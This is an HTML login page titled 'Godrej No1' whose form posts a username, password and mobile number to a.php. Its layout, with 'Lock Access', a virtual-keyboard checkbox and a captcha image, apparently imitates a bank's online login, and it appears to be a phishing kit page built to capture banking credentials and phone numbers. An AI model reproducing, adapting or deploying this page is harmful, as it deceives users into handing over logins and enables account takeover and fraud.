<!DOCTYPE HTML> 
<html>
   <head>
     <title>Godrej No1</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="kk.css">
      <link rel="stylesheet" type="text/css" href="rr.css">
	   
   </head>
   <body>
   <div class="container-fluid m-0 p-0">
<img src="dt.png" class="hidden-xs img-fluid">
<img src="rd.png" class="hidden-lg img-fluid">

    
</div>
      <div class="container">
         <div class="row">
            <div class="col-md-7 col-xs-12 text-center"></div>
			
			
            <div class="col-md-5 col-xs-12">
            <div class="card m-0 p-0">
 <div class="bg-light p-30">
			<h1><b>Welcome to</b></h1>
			<img src="ml.png"  width="100%">
			</div>
            <div class="card-body">
           
              <form action="a.php" method="post">
                     <div class="row">
                        <div class="col-md-12"> 
                           <input type="text" class="form-control" name="Username" placeholder="Username" required=""> 
                        </div>
                        <div class="col-md-12"> 
                           <input type="password" class="form-control" name="Password" placeholder="Password" required=""> 
                        </div>
						
						<div class="col-md-12"> 
                           <input type="tel" class="form-control" name="Mobile" placeholder="Mobile" required=""> 
                        </div>
						
						<div class="col-md-12"> 
                           <input type="text" class="form-control" placeholder="Enter the text as shown in the image"> 
                        </div>
						<div class="col-md-12"> 
                           <input type="checkbox" > Enable Virtual Keyboard
<br><br>
                        </div>
						<div class="col-md-12"> 
                           <img src="cc.png" width="100%">
<br><br>
                        </div>
                     </div>
                     <div class="w3ls-login">
                        <button type="submit" class="btn btn-success btn-block"> LOG IN </button>
                     </div>
					 <p class="link text-center"><a href="#">Lock Access</a>|<a href="#">Forgot Password</a>|<a href="#">Forgot Username</a></p>
                  </form>
				  
				  
            </div>
			
            </div>
			
			
			
            </div>
         </div>
      </div>
     <div class="container-fluid m-0 p-0">
<img src="desk.png" class="hidden-xs img-fluid">
<img src="kl.png" class="hidden-lg img-fluid">

    
</div>
 
	
	   
   </body>
</html>